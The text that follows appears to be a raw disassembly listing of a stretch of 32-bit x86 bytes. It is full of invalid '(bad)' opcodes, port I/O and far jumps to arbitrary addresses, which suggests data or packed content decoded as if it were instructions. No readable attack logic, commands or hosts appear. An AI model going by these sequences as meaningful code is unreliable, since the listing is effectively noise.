  415a8a:	fcomp  QWORD PTR [ecx]
  415a8c:	into   
  415a8d:	and    bl,dh
  415a8f:	and    al,0x67
  415a91:	arpl   WORD PTR [edi-0x7617a6],sp
  415a97:	les    esp,FWORD PTR [edx+0x71]
  415a9a:	xchg   edx,eax
  415a9b:	sub    BYTE PTR [eax-0x6c3411bf],cl
  415aa1:	(bad)  
  415aa2:	loopne 0x415a25
  415aa4:	jne    0x415a31
  415aa6:	and    BYTE PTR [ecx+0x4c7fd360],bl
  415aac:	es sub eax,0xa1825809
  415ab2:	xor    ebx,ebp
  415ab4:	aas    
  415ab5:	mov    eax,0x6acd0e8c
  415aba:	out    0x14,eax
  415abc:	fcomp  QWORD PTR [ebp+ebx*8+0x221551f0]
  415ac3:	add    bl,BYTE PTR [ebx-0x47]
  415ac6:	xor    eax,0x19f1bf5b
  415acb:	les    esp,FWORD PTR [edi]
  415acd:	xlat   BYTE PTR ds:[ebx]
  415ace:	daa    
  415acf:	and    BYTE PTR [ebx+0x29a6d33e],dl
  415ad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ad6:	xor    ebp,ecx
  415ad8:	xchg   edx,eax
  415ad9:	mov    esi,0x86ac3075
  415ade:	mov    dh,0x12
  415ae0:	jnp    0x415ace
  415ae2:	jge    0x415ac8
  415ae4:	push   esi
  415ae5:	outs   dx,BYTE PTR ds:[esi]
  415ae6:	mov    DWORD PTR ds:0xc81f0ae7,eax
  415aec:	call   0x59780521
  415af1:	add    al,0xde
  415af3:	lds    edx,FWORD PTR [ecx]
  415af5:	and    ebx,DWORD PTR [esi-0x73f7b39d]
  415afb:	add    ebp,DWORD PTR [ebx+0x1b11ca8a]
  415b01:	jbe    0x415b70
  415b03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b05:	outs   dx,BYTE PTR ds:[esi]
  415b06:	push   esp
  415b07:	pop    eax
  415b08:	inc    esi
  415b09:	or     BYTE PTR [edi+0x25565b53],bh
  415b0f:	xchg   ebx,eax
  415b10:	mov    eax,ds:0x5d4ef93f
  415b15:	sub    DWORD PTR [ebp+eax*2+0x7b49fa98],esi
  415b1c:	mov    bh,0x9d
  415b1e:	(bad)  
  415b1f:	fnsave [edi-0x3135a1f2]
  415b25:	lahf   
  415b26:	mov    ebp,0x526f51d3
  415b2b:	mov    WORD PTR [eax-0x2cb94c97],ds
  415b31:	mov    WORD PTR [esi+0x613e298],ss
  415b37:	out    dx,al
  415b38:	mov    dh,0x45
  415b3a:	sub    eax,0x32ecee53
  415b3f:	cmp    esp,0x8
  415b42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b43:	bound  edi,QWORD PTR [edi]
  415b45:	lods   eax,DWORD PTR ds:[esi]
  415b46:	mov    DWORD PTR [eax-0x3ab6b968],ebx
  415b4c:	int3   
  415b4d:	adc    dh,BYTE PTR [edi]
  415b4f:	push   cs
  415b50:	(bad)  
  415b51:	fst    DWORD PTR [ebp-0x183441a8]
  415b57:	stc    
  415b58:	cmp    BYTE PTR [eax],cl
  415b5a:	add    DWORD PTR [esi-0x58],0x5cfc181a
  415b61:	sub    BYTE PTR [eax-0x5e63c044],bl
  415b67:	cmp    edi,DWORD PTR [edx-0x63ee8ea]
  415b6d:	and    ebx,DWORD PTR [edi-0x41952bcd]
  415b73:	cmp    ah,dl
  415b75:	adc    al,0x18
  415b77:	xor    al,0x6c
  415b79:	shr    DWORD PTR [edx+0x7e2b9596],0xb5
  415b80:	add    al,0x86
  415b82:	or     dh,BYTE PTR [esp+edx*4-0x1e]
  415b86:	mov    DWORD PTR [ebp-0x4e],esp
  415b89:	jle    0x415ba6
  415b8b:	cwde   
  415b8c:	scas   al,BYTE PTR es:[edi]
  415b8d:	xlat   BYTE PTR ds:[ebx]
  415b8e:	mov    eax,0x150d5e26
  415b93:	sbb    BYTE PTR [esi+0x6b],cl
  415b96:	xor    bl,ah
  415b98:	lds    ecx,FWORD PTR [ebx-0x3c1d1afc]
  415b9e:	xor    BYTE PTR [edi],bh
  415ba0:	push   edi
  415ba1:	dec    ebx
  415ba2:	and    ebx,DWORD PTR [esi+0x6a]
  415ba5:	mov    al,ds:0x40c5927e
  415baa:	test   DWORD PTR [edi+0x9],esp
  415bad:	loope  0x415b46
  415baf:	stos   BYTE PTR es:[edi],al
  415bb0:	cld    
  415bb1:	add    dl,BYTE PTR [ecx+0x1bacc3c7]
  415bb7:	or     ch,BYTE PTR [ecx-0x119a05d9]
  415bbd:	iret   
  415bbe:	into   
  415bbf:	adc    al,0xa7
  415bc1:	(bad)  
  415bc2:	jmp    0x415c05
  415bc4:	xlat   BYTE PTR ds:[ebx]
  415bc5:	dec    esp
  415bc6:	add    ah,cl
  415bc8:	adc    DWORD PTR [eax+esi*1],edi
  415bcb:	or     DWORD PTR [ecx],edi
  415bcd:	in     eax,0xbe
  415bcf:	sbb    eax,0x3e282206
  415bd4:	xchg   esp,eax
  415bd5:	lea    esp,[ebp+0x4f97e68d]
  415bdb:	push   esi
  415bdc:	fnstcw WORD PTR [edx]
  415bde:	scas   eax,DWORD PTR es:[edi]
  415bdf:	cmp    ebx,ebx
  415be1:	shr    BYTE PTR [eax+0x65],1
  415be4:	test   ecx,esp
  415be6:	mov    esi,ebx
  415be8:	mov    edx,0x7b4f8ed2
  415bed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bee:	or     DWORD PTR [esi+0x4c528b31],ecx
  415bf4:	cs stos BYTE PTR es:[edi],al
  415bf6:	loop   0x415bde
  415bf8:	int    0x4c
  415bfa:	jo     0x415c6a
  415bfc:	pop    ss
  415bfd:	loopne 0x415c02
  415bff:	mov    ah,0x7a
  415c01:	cmp    esp,DWORD PTR [esi-0x583002da]
  415c07:	shl    al,1
  415c09:	sbb    DWORD PTR [eax],esp
  415c0b:	push   eax
  415c0c:	aad    0xa0
  415c0e:	adc    eax,0x8a6fdca4
  415c13:	cmp    ecx,DWORD PTR [ecx+0x2e]
  415c16:	adc    BYTE PTR [ebp+0x1980dd7a],bl
  415c1c:	nop
  415c1d:	add    eax,0xcb9e5178
  415c22:	sub    dl,BYTE PTR [eax]
  415c24:	ret    0x91cd
  415c27:	jge    0x415c28
  415c29:	fst    QWORD PTR [ecx+edi*8+0x59852803]
  415c30:	or     al,0x19
  415c32:	nop
  415c33:	in     eax,0xff
  415c35:	xor    eax,0xff2354c9
  415c3a:	je     0x415c1b
  415c3c:	mov    al,ds:0x3a02e760
  415c41:	dec    ecx
  415c42:	cdq    
  415c43:	adc    al,BYTE PTR [eax-0x50f2c634]
  415c49:	jge    0x415c88
  415c4b:	leave  
  415c4c:	push   ebp
  415c4d:	jns    0x415c6a
  415c4f:	pop    esp
  415c50:	pop    eax
  415c51:	ret    0x1216
  415c54:	into   
  415c55:	sub    al,0x68
  415c57:	xchg   edx,eax
  415c58:	pop    ebp
  415c59:	fs dec edx
  415c5b:	and    al,0x37
  415c5d:	enter  0xa10,0xc2
  415c61:	mov    bl,0xc5
  415c63:	lods   al,BYTE PTR ds:[esi]
  415c64:	mov    esi,0xb962f485
  415c69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c6a:	dec    DWORD PTR [esi+0x73ba0584]
  415c70:	out    dx,eax
  415c71:	inc    esp
  415c72:	pushf  
  415c73:	inc    ebx
  415c74:	cdq    
  415c75:	push   eax
  415c76:	je     0x415c03
  415c78:	and    BYTE PTR [edi+edx*8+0x22],ah
  415c7c:	or     DWORD PTR [ecx],edi
  415c7e:	test   eax,0x8885b007
  415c83:	ins    BYTE PTR es:[edi],dx
  415c84:	pop    ds
  415c85:	push   ebx
  415c86:	jg     0x415c25
  415c88:	jge    0x415c43
  415c8a:	fmulp  st(6),st
  415c8c:	das    
  415c8d:	xchg   edi,eax
  415c8e:	outs   dx,DWORD PTR ds:[esi]
  415c8f:	ds sti 
  415c91:	fsubr  DWORD PTR [ebp-0x5da54b1c]
  415c97:	and    al,0xb1
  415c99:	stc    
  415c9a:	adc    eax,0x58f5472d
  415c9f:	out    0x7e,al
  415ca1:	sahf   
  415ca2:	or     DWORD PTR [ebx-0x727848f],esp
  415ca8:	pop    es
  415ca9:	xchg   esi,eax
  415caa:	add    eax,0xb1717b98
  415caf:	jno    0x415c81
  415cb1:	fdivp  st(4),st
  415cb3:	mov    bl,0xa4
  415cb5:	mov    al,0x2f
  415cb7:	ins    DWORD PTR es:[edi],dx
  415cb8:	jns    0x415c8c
  415cba:	icebp  
  415cbb:	xchg   BYTE PTR [ecx+ebx*8],dh
  415cbe:	shl    DWORD PTR [edi-0x343f1f9],0x75
  415cc5:	gs cs xchg ecx,edi
  415cc9:	push   0x35eecfc7
  415cce:	xor    ebp,DWORD PTR [ebx]
  415cd0:	ins    BYTE PTR es:[edi],dx
  415cd1:	dec    edx
  415cd2:	xchg   ecx,eax
  415cd3:	xor    eax,DWORD PTR [eax+0x5d]
  415cd6:	adc    cl,ch
  415cd8:	outs   dx,DWORD PTR ds:[esi]
  415cd9:	or     al,0xc3
  415cdb:	sub    BYTE PTR [esi+0xf1c3e36],bh
  415ce1:	lahf   
  415ce2:	push   esi
  415ce3:	xor    ch,bl
  415ce5:	retf   0xb168
  415ce8:	mov    eax,ds:0x53c29d66
  415ced:	fs (bad) 
  415cef:	(bad)  
  415cf0:	es pop edx
  415cf2:	pop    esp
  415cf3:	jg     0x415d3a
  415cf5:	test   al,0x9f
  415cf7:	jg     0x415d3a
  415cf9:	pop    ecx
  415cfa:	add    al,0x33
  415cfc:	adc    ah,BYTE PTR [eax]
  415cfe:	ja     0x415d2b
  415d00:	arpl   WORD PTR [eax+0x73],ax
  415d03:	mov    ds,ecx
  415d05:	sub    DWORD PTR [ecx-0x38ccc09a],esp
  415d0b:	test   eax,0x49ddfcc8
  415d10:	cmp    DWORD PTR [ebx],0x35
  415d13:	and    dh,BYTE PTR [eax]
  415d15:	mov    al,0xbb
  415d17:	sub    edx,esp
  415d19:	imul   edi,ecx,0xda1696cc
  415d1f:	xchg   esi,eax
  415d20:	test   al,0xcd
  415d22:	adc    eax,0x771c9b06
  415d27:	loopne 0x415cb6
  415d29:	jmp    0x7354:0x3394c1b1
  415d30:	les    edx,FWORD PTR [ecx]
  415d32:	lds    edx,FWORD PTR [ebp+0x31404c03]
  415d38:	lods   eax,DWORD PTR ds:[esi]
  415d39:	jnp    0x415cdf
  415d3b:	rcl    ebx,0xa7
  415d3e:	ret    0x12a2
  415d41:	leave  
  415d42:	dec    edx
  415d43:	xlat   BYTE PTR ds:[ebx]
  415d44:	daa    
  415d45:	lea    eax,ds:0x50746991
  415d4b:	nop
  415d4c:	cmc    
  415d4d:	or     dl,BYTE PTR ds:0x6cd25dc9
  415d53:	in     eax,0x72
  415d55:	mov    esi,0x9f066da1
  415d5a:	imul   edx,DWORD PTR [edx-0x20],0xa6c9a287
  415d61:	and    DWORD PTR [ecx-0x59],0xfdc9e53f
  415d68:	push   ds
  415d69:	cli    
  415d6a:	fwait
  415d6b:	xchg   edi,eax
  415d6c:	cwde   
  415d6d:	out    0xa9,eax
  415d6f:	dec    ebx
  415d70:	mov    ?,WORD PTR [ebx]
  415d72:	cmp    eax,ebp
  415d74:	les    ebx,FWORD PTR [eax]
  415d76:	popf   
  415d77:	stc    
  415d78:	xor    DWORD PTR [ebx+0x76],0x1fb56ced
  415d7f:	mov    bh,0xd
  415d81:	cs (bad) 
  415d83:	or     dl,BYTE PTR [edx+0x2f]
  415d86:	dec    esp
  415d87:	out    0x44,al
  415d89:	rcr    DWORD PTR [esi+0x732cdff0],0x70
  415d90:	aam    0xc7
  415d92:	mov    bl,0x1f
  415d94:	rcl    ebx,0x56
  415d97:	adc    cl,dh
  415d99:	push   es
  415d9a:	pusha  
  415d9b:	les    ebx,FWORD PTR [eax-0x54]
  415d9e:	loop   0x415dc2
  415da0:	mov    ds:0xe010e16a,eax
  415da5:	out    0xde,al
  415da7:	fs mov ch,0x2f
  415daa:	pop    ds
  415dab:	cmp    eax,0xf41daca
  415db0:	push   ds
  415db1:	inc    esi
  415db2:	add    ebp,ebx
  415db4:	lods   eax,DWORD PTR ds:[esi]
  415db5:	sub    al,0xc8
  415db7:	mov    ds:0xa3fe676d,al
  415dbc:	cmc    
  415dbd:	lds    edx,FWORD PTR [eax+0x3a597222]
  415dc3:	or     BYTE PTR [ecx-0x1b7c9031],ch
  415dc9:	test   eax,0xcd39d0d
  415dce:	lds    sp,DWORD PTR [ecx]
  415dd1:	adc    DWORD PTR [esi+0x7e0a2705],0x4d
  415dd8:	repnz add eax,0x5e6dd6d0
  415dde:	jne    0x415dd9
  415de0:	jg     0x415e11
  415de2:	add    DWORD PTR [ebp-0xe],edi
  415de5:	and    eax,0x83043eb2
  415dea:	(bad)  
  415deb:	xchg   edi,eax
  415dec:	mov    cl,0x6
  415dee:	int    0x4f
  415df0:	dec    ebx
  415df1:	adc    dh,cl
  415df3:	in     al,0x38
  415df5:	push   0xffbc4343
  415dfa:	fdivp  st(0),st
  415dfc:	or     bl,dl
  415dfe:	shl    DWORD PTR [edx+eiz*1],1
  415e01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e02:	mov    ecx,0x246a235c
  415e07:	lods   al,BYTE PTR ds:[esi]
  415e08:	and    BYTE PTR [eax+0x11c7d3e5],bh
  415e0e:	ficomp WORD PTR [ebp-0x51]
  415e11:	stos   BYTE PTR es:[edi],al
  415e12:	icebp  
  415e13:	je     0x415da0
  415e15:	mov    ecx,0x3f971aa8
  415e1a:	fadd   QWORD PTR [ebp*2-0x1117d4f9]
  415e21:	jmp    0xed5d:0x6be01537
  415e28:	ins    BYTE PTR es:[edi],dx
  415e29:	int3   
  415e2a:	mov    ch,0xa2
  415e2c:	aas    
  415e2d:	push   ecx
  415e2e:	mov    ah,0x44
  415e30:	cmp    DWORD PTR [ebx],esp
  415e32:	inc    ecx
  415e33:	or     al,0x42
  415e35:	pop    ebp
  415e36:	in     al,dx
  415e37:	lods   al,BYTE PTR ds:[esi]
  415e38:	rol    BYTE PTR ds:0x62bb5936,1
  415e3e:	pop    esp
  415e3f:	les    ebx,FWORD PTR [edx]
  415e41:	push   eax
  415e42:	sub    edx,DWORD PTR [ebx]
  415e44:	mov    dh,0x2b
  415e46:	add    BYTE PTR [esi-0x6d],bh
  415e49:	pushf  
  415e4a:	xchg   esp,eax
  415e4b:	fdiv   DWORD PTR [edx]
  415e4d:	js     0x415dd5
  415e4f:	adc    BYTE PTR [eax-0x2ebf18ff],cl
  415e55:	fs push ss
  415e57:	inc    edx
  415e58:	xor    al,0x5e
  415e5a:	jae    0x415eb1
  415e5c:	aam    0x8d
  415e5e:	cmp    DWORD PTR [ebp-0x39],0x43
  415e62:	mov    esp,0xc1d3c490
  415e67:	retf   
  415e68:	or     eax,0xd76d4917
  415e6d:	std    
  415e6e:	and    BYTE PTR [ebp+0x50],dh
  415e71:	daa    
  415e72:	push   ecx
  415e73:	cmp    al,0xfb
  415e75:	(bad)  
  415e76:	or     DWORD PTR [esi],ebp
  415e78:	lock call DWORD PTR [ebx-0x420c35d9]
  415e7f:	mov    eax,0x93b1684c
  415e84:	push   edx
  415e85:	and    DWORD PTR [edi],ebp
  415e87:	inc    eax
  415e88:	daa    
  415e89:	pop    ss
  415e8a:	add    eax,0x944ac562
  415e8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e90:	adc    bl,BYTE PTR [esi-0x623bfd73]
  415e96:	or     al,0x60
  415e98:	jne    0x415e96
  415e9a:	das    
  415e9b:	mov    eax,ds:0xe73daa91
  415ea0:	mov    bh,0x9e
  415ea2:	enter  0x7455,0xc
  415ea6:	addr16 into 
  415ea8:	dec    esi
  415ea9:	xchg   edi,eax
  415eaa:	call   0xf9fd:0xbde898ef
  415eb1:	mov    ah,0xea
  415eb3:	in     al,dx
  415eb4:	mov    eax,ds:0xc57f0a48
  415eb9:	shl    DWORD PTR [edx+0x0],1
  415ebc:	inc    ebx
  415ebd:	out    0xcc,eax
  415ebf:	inc    ebx
  415ec0:	cmp    al,al
  415ec2:	popa   
  415ec3:	lods   eax,DWORD PTR ds:[esi]
  415ec4:	mov    ecx,0x92215042
  415ec9:	das    
  415eca:	cmp    DWORD PTR [edx],esi
  415ecc:	jge    0x415efc
  415ece:	or     ah,BYTE PTR [edi+esi*8+0x11]
  415ed2:	or     ch,bl
  415ed4:	pop    ds
  415ed5:	add    ah,BYTE PTR [ebx+edi*8-0x75b006db]
  415edc:	cmp    DWORD PTR ds:0x57080bcc,esp
  415ee2:	bound  eax,QWORD PTR [edi-0x570b82dc]
  415ee8:	out    0xa6,eax
  415eea:	sub    al,0xe3
  415eec:	aas    
  415eed:	retf   
  415eee:	jp     0x415f5c
  415ef0:	dec    ecx
  415ef1:	cmp    al,0xcc
  415ef3:	repz dec esi
  415ef5:	mov    ds:0xbe8b4393,al
  415efa:	in     eax,dx
  415efb:	imul   ebp,ecx,0xf56b68f2
  415f01:	and    eax,0x8aeebb0b
  415f06:	ficom  WORD PTR [ecx]
  415f08:	in     eax,dx
  415f09:	sub    DWORD PTR [ebx],eax
  415f0b:	jne    0x415f1f
  415f0d:	add    bl,dl
  415f0f:	adc    ch,bh
  415f11:	sti    
  415f12:	cli    
  415f13:	add    esi,ebp
  415f15:	push   esp
  415f16:	sub    esp,edi
  415f18:	xor    BYTE PTR [ebp+0x43],ah
  415f1b:	dec    ebx
  415f1c:	rol    DWORD PTR [edx-0x75c4f6be],0x8e
  415f23:	repz mov ds:0x8344c0aa,eax
  415f29:	dec    edi
  415f2a:	xlat   BYTE PTR ds:[ebx]
  415f2b:	scas   eax,DWORD PTR es:[edi]
  415f2c:	js     0x415ef1
  415f2e:	int    0xf6
  415f30:	in     al,dx
  415f31:	jnp    0x415ef0
  415f33:	dec    esi
  415f34:	xor    BYTE PTR [esi],al
  415f36:	int3   
  415f37:	ret    
  415f38:	cmp    al,0xe6
  415f3a:	retf   0xf694
  415f3d:	cdq    
  415f3e:	stc    
  415f3f:	leave  
  415f40:	call   0x69fc:0x669b8353
  415f47:	inc    esp
  415f48:	sbb    BYTE PTR [edx+0x2cae44bd],bl
  415f4e:	and    eax,0x816aca75
  415f53:	xlat   BYTE PTR ds:[ebx]
  415f54:	jne    0x415fd4
  415f56:	sbb    al,0x1e
  415f58:	mov    eax,ds:0x2cd72a4f
  415f5d:	in     eax,dx
  415f5e:	mov    edx,0x1d5f595d
  415f63:	xlat   BYTE PTR ds:[ebx]
  415f64:	icebp  
  415f65:	stos   DWORD PTR es:[edi],eax
  415f66:	push   ebx
  415f67:	push   ss
  415f68:	push   ebx
  415f69:	dec    ecx
  415f6a:	cld    
  415f6b:	out    0xe,eax
  415f6d:	je     0x415fa1
  415f6f:	jno    0x415f43
  415f71:	in     eax,0x3d
  415f73:	fsub   st,st(5)
  415f75:	xor    eax,0xa3d408a8
  415f7a:	pop    ds
  415f7b:	mov    BYTE PTR [ebp-0xf],dh
  415f7e:	enter  0x5f1f,0x3
  415f82:	adc    eax,0x17b113df
  415f87:	mov    esp,0x2444f3a6
  415f8c:	adc    al,0xa0
  415f8e:	add    al,0x24
  415f90:	or     BYTE PTR [eax+0x37],al
  415f93:	or     BYTE PTR [ebp+0x78],ah
  415f96:	and    dh,BYTE PTR [ebx]
  415f98:	iret   
  415f99:	xchg   esp,eax
  415f9a:	leave  
  415f9b:	enter  0x648c,0x46
  415f9f:	xor    DWORD PTR [ebx-0x51],ebp
  415fa2:	rcr    DWORD PTR [ecx],cl
  415fa4:	push   es
  415fa5:	mov    esp,0x86dfb341
  415faa:	addr16 xchg edx,eax
  415fac:	mov    DWORD PTR [ebx+0x7573f1ca],eax
  415fb2:	ins    DWORD PTR es:[edi],dx
  415fb3:	cli    
  415fb4:	pop    ss
  415fb5:	mov    BYTE PTR [esi],ah
  415fb7:	sub    edi,DWORD PTR [edi-0x24]
  415fba:	mov    eax,fs:0xd5aa5488
  415fc0:	add    al,0x6c
  415fc2:	push   cs
  415fc3:	add    eax,DWORD PTR ds:[esi+0x5c]
  415fc7:	pusha  
  415fc8:	fsubr  st,st(2)
  415fca:	das    
  415fcb:	adc    bl,BYTE PTR [eax+0x25]
  415fce:	jecxz  0x415fb2
  415fd0:	in     al,dx
  415fd1:	mov    ss,WORD PTR [edx+0x1c9c6cc7]
  415fd7:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fd9:	mov    DWORD PTR [edx],ecx
  415fdb:	enter  0x62d6,0x9
  415fdf:	sub    DWORD PTR [eax-0x68c44b08],0xb6ed043b
  415fe9:	js     0x415fe6
  415feb:	xor    BYTE PTR [ecx+0x7c18054f],ch
  415ff1:	or     DWORD PTR [si+0x7c],edx
  415ff5:	push   0xfffffffd
  415ff7:	and    DWORD PTR [edx-0x42],0x2b1a2b26
  415ffe:	jno    0x416001
  416000:	out    dx,eax
  416001:	jmp    0x42627920
  416006:	lods   eax,DWORD PTR ds:[esi]
  416007:	shl    ebx,0x25
  41600a:	call   0x1e99:0xe245c51
  416011:	cmc    
  416012:	(bad)  
  416013:	mov    esi,0xcd3b524
  416018:	or     eax,0x9701c8dd
  41601d:	jae    0x416007
  41601f:	push   ebp
  416020:	push   ss
  416021:	xchg   ebp,eax
  416022:	dec    ebp
  416023:	inc    esi
  416024:	sub    al,0x5f
  416026:	push   eax
  416027:	pop    esp
  416028:	in     eax,dx
  416029:	pop    ecx
  41602a:	add    dh,BYTE PTR [ebp+0x7e]
  41602d:	std    
  41602e:	ja     0x41600e
  416030:	dec    edx
  416031:	dec    DWORD PTR [ecx]
  416033:	into   
  416034:	jecxz  0x416040
  416036:	inc    edi
  416037:	cld    
  416038:	cmp    BYTE PTR [edi-0x6e],dl
  41603b:	nop
  41603c:	gs inc edi
  41603e:	fcomp  DWORD PTR [ecx+ecx*1]
  416041:	push   esp
  416042:	shr    DWORD PTR [esi+edi*4],1
  416045:	inc    eax
  416046:	pop    ebp
  416047:	int    0xbe
  416049:	adc    DWORD PTR [edx+0x22],ecx
  41604c:	popf   
  41604d:	pop    esp
  41604e:	lods   eax,DWORD PTR ds:[esi]
  41604f:	xchg   esi,eax
  416050:	dec    eax
  416051:	jnp    0x416024
  416053:	dec    ecx
  416054:	bound  ebp,QWORD PTR [eax]
  416056:	fsub   QWORD PTR [ebp+0x6aa175e6]
  41605c:	mov    bh,0xfd
  41605e:	(bad)  
  41605f:	jp     0x415ff5
  416061:	push   ss
  416062:	mov    ds:0x49af63bd,eax
  416067:	pop    esp
  416068:	inc    esp
  416069:	fild   DWORD PTR [edi]
  41606b:	and    al,0x58
  41606d:	jg     0x415ff7
  41606f:	ror    BYTE PTR [ebx],0x9f
  416072:	jno    0x415ffa
  416074:	shr    DWORD PTR [eax],cl
  416076:	int3   
  416077:	inc    esi
  416078:	push   eax
  416079:	in     al,0x29
  41607b:	retf   
  41607c:	bound  esi,QWORD PTR [edx]
  41607e:	cdq    
  41607f:	dec    edx
  416080:	enter  0xfc18,0x77
  416084:	test   eax,0x5b10c330
  416089:	adc    esp,ebp
  41608b:	sbb    eax,0x4563912c
  416090:	xor    BYTE PTR [edi],bl
  416092:	pextrw ebx,(bad),0xc5
  416094:	call   0xca7b:0x85b382da
  41609b:	pushf  
  41609c:	inc    eax
  41609d:	fidivr DWORD PTR [eax+0x7a]
  4160a0:	dec    esp
  4160a1:	xchg   edi,eax
  4160a2:	(bad)  
  4160a3:	sbb    al,al
  4160a5:	cmc    
  4160a6:	sti    
  4160a7:	jle    0x416109
  4160a9:	outs   dx,BYTE PTR ds:[esi]
  4160aa:	enter  0xc81c,0xe6
  4160ae:	xor    esp,DWORD PTR [ebx+0x28472751]
  4160b4:	sbb    dl,BYTE PTR [ecx]
  4160b6:	aam    0x1
  4160b8:	ror    DWORD PTR [edx],cl
  4160ba:	and    al,0xfa
  4160bc:	sahf   
  4160bd:	in     al,0xbd
  4160bf:	jle    0x41604d
  4160c1:	neg    dh
  4160c3:	mov    eax,ebx
  4160c5:	inc    edx
  4160c6:	lahf   
  4160c7:	dec    esi
  4160c8:	push   ss
  4160c9:	and    al,0x52
  4160cb:	fs mov ebp,esp
  4160ce:	addr16 mov edx,0xd2020bc2
  4160d4:	enter  0xa5f8,0x39
  4160d8:	and    eax,0x7b1886c3
  4160dd:	and    edx,DWORD PTR [ebx+0x3e093ff1]
  4160e3:	and    DWORD PTR [edi-0x78],esi
  4160e6:	xchg   ebp,eax
  4160e7:	popf   
  4160e8:	inc    eax
  4160e9:	adc    bh,al
  4160eb:	inc    esp
  4160ec:	pop    eax
  4160ed:	outs   dx,DWORD PTR ds:[esi]
  4160ee:	mov    ch,0x4e
  4160f0:	add    ax,WORD PTR [ecx-0x4c824630]
  4160f7:	adc    DWORD PTR [edi+0x20],ecx
  4160fa:	dec    esi
  4160fb:	push   ds
  4160fc:	jne    0x4160fa
  4160fe:	shl    esi,0x3d
  416101:	inc    ebx
  416102:	ficom  DWORD PTR [edi]
  416104:	out    dx,al
  416105:	xor    al,0xde
  416107:	cmp    BYTE PTR [esp+ebx*8-0x309545a0],0xcf
  41610f:	push   ds
  416110:	ins    BYTE PTR es:[edi],dx
  416111:	retf   
  416112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416113:	sub    esi,eax
  416115:	dec    ecx
  416116:	jo     0x416155
  416118:	and    ch,BYTE PTR [edi+0x5d74adf0]
  41611e:	and    eax,0x352a471f
  416123:	adc    ch,0xc6
  416126:	add    DWORD PTR [ebp-0xc],0x6db70c85
  41612d:	popf   
  41612e:	mov    dh,0xe7
  416130:	push   eax
  416131:	mov    ecx,0xc787b433
  416136:	ror    DWORD PTR [edi-0x29],0xeb
  41613a:	outs   dx,BYTE PTR ds:[esi]
  41613b:	in     eax,0x38
  41613d:	es ret 
  41613f:	fdiv   DWORD PTR [edi]
  416141:	sbb    edi,DWORD PTR [edx+eax*1]
  416144:	cli    
  416145:	loope  0x4160e2
  416147:	cmp    eax,DWORD PTR [ebp-0x6]
  41614a:	outs   dx,BYTE PTR ds:[esi]
  41614b:	xchg   edi,eax
  41614c:	xchg   BYTE PTR [ecx],ch
  41614e:	enter  0xd306,0xb5
  416152:	mov    ch,0xf8
  416154:	xor    eax,0x4ca5f90e
  416159:	dec    edi
  41615a:	jne    0x4161b3
  41615c:	popa   
  41615d:	cmp    eax,DWORD PTR [edx]
  41615f:	outs   dx,BYTE PTR ds:[esi]
  416160:	scas   eax,DWORD PTR es:[edi]
  416161:	sti    
  416162:	xor    eax,eax
  416164:	fcomp  QWORD PTR [ecx]
  416166:	push   ds
  416167:	loopne 0x416101
  416169:	dec    esp
  41616a:	xor    BYTE PTR [edx-0x6b67c7f1],0x35
  416171:	xchg   edi,eax
  416172:	mov    esp,0x1ebc5021
  416177:	inc    edx
  416178:	xchg   ebx,eax
  416179:	mov    dh,0x68
  41617b:	xor    BYTE PTR [ebx-0x70a4f0fe],0x68
  416182:	push   0x5e
  416184:	jno    0x4161c8
  416186:	or     BYTE PTR [ecx],dh
  416188:	jg     0x4161c4
  41618a:	cdq    
  41618b:	fwait
  41618c:	call   0x119d:0xd7883b59
  416193:	and    eax,0xe38004d8
  416198:	jne    0x41616f
  41619a:	retf   0xfdd9
  41619d:	arpl   si,di
  41619f:	mov    bl,0xaa
  4161a1:	pop    edx
  4161a2:	sub    eax,0x68c9d824
  4161a7:	xchg   ebx,eax
  4161a8:	leave  
  4161a9:	les    esp,FWORD PTR [ecx-0x75f8dc6a]
  4161af:	push   0x4f
  4161b1:	jbe    0x4161ae
  4161b3:	retf   0x76f7
  4161b6:	dec    esi
  4161b7:	loop   0x4161e1
  4161b9:	jmp    0x8f4631f8
  4161be:	out    dx,eax
  4161bf:	lock (bad) 
  4161c1:	out    dx,eax
  4161c2:	push   ebx
  4161c3:	mov    ebx,0xd5916b5e
  4161c8:	add    bh,BYTE PTR [ebp-0x17]
  4161cb:	pop    ss
  4161cc:	lods   al,BYTE PTR ds:[esi]
  4161cd:	popa   
  4161ce:	sbb    DWORD PTR ds:0x7c953667,0x50a7d3e8
  4161d8:	jg     0x416251
  4161da:	xchg   ebp,eax
  4161db:	push   esp
  4161dc:	jmp    0x3430:0x5b95ede2
  4161e3:	stos   BYTE PTR es:[edi],al
  4161e4:	push   0xb36c24fd
  4161e9:	or     BYTE PTR ds:0x483f5e13,cl
  4161ef:	jo     0x41622d
  4161f1:	outs   dx,BYTE PTR ds:[esi]
  4161f2:	or     edi,ecx
  4161f4:	add    DWORD PTR [ebx],ebp
  4161f6:	outs   dx,DWORD PTR ds:[esi]
  4161f7:	ja     0x416181
  4161f9:	jae    0x4161cb
  4161fb:	fwait
  4161fc:	test   DWORD PTR [esi+0x34],esi
  4161ff:	icebp  
  416200:	mov    edi,0x4b35b764
  416205:	xor    eax,0x74554885
  41620a:	or     al,0xfd
  41620c:	push   esp
  41620d:	xchg   edi,eax
  41620e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41620f:	inc    esp
  416210:	call   0x8a3f:0x40ead69d
  416217:	pmullw mm0,mm6
  41621a:	mov    al,bh
  41621c:	jmp    0xacd4:0x7cfcafc3
  416223:	iret   
  416224:	fwait
  416225:	pop    ss
  416226:	sbb    eax,0xb3c5a874
  41622b:	lds    edx,FWORD PTR es:[edx]
  41622e:	dec    esp
  41622f:	mov    al,0x6c
  416231:	mov    ebx,0xe3b34d14
  416236:	iret   
  416237:	test   BYTE PTR [esi-0x59],cl
  41623a:	cmp    dh,BYTE PTR ds:[ebx+0x7c285cc3]
  416241:	xor    DWORD PTR [edi+0x69],ebx
  416244:	(bad)  
  416245:	dec    ebp
  416246:	inc    ebp
  416247:	push   ss
  416248:	lods   eax,DWORD PTR ds:[esi]
  416249:	out    0xa5,eax
